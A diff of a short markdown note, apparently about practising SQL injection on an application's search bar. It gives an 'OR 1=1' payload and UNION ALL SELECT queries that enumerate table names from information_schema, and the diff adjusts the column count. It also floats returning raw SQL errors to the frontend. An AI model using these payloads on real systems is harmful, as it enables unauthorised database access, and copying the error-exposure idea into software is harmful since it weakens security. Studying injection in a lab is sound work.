@@ -7,7 +7,7 @@ Simples sql injection is possible by putting `'OR 1=1) -- '` in the search bar
 Could be good to allow user to look into the query syntax somehow on error (return sql errors straight to the fronted?)
 
 Next step is getting info about tables:
-`') UNION ALL SELECT 1, 2, 3, 4 FROM information_schema.tables -- .`
+`') UNION ALL SELECT 0,1,2,3,4,5,6,7,8,9 FROM information_schema.tables -- .`
 
 INFORMATION_SCHEMA.TABLES have columns:
 
@@ -16,8 +16,8 @@ INFORMATION_SCHEMA.TABLES have columns:
 > CREATE_TIME, UPDATE_TIME, CHECK_TIME, TABLE_COLLATION, CHECKSUM,
 > CREATE_OPTIONS, TABLE_COMMENT
 
-Useful are probably those:
+Useful is probably this one:
 
-> TABLE_NAME, TABLE_ROWS
+> TABLE_NAME
 
-`') UNION ALL SELECT table_name, null,null,null FROM information_schema.tables -- .`
+`') UNION ALL SELECT 0,1,table_name,3,4,5,6,7,8,9 FROM information_schema.tables -- .`
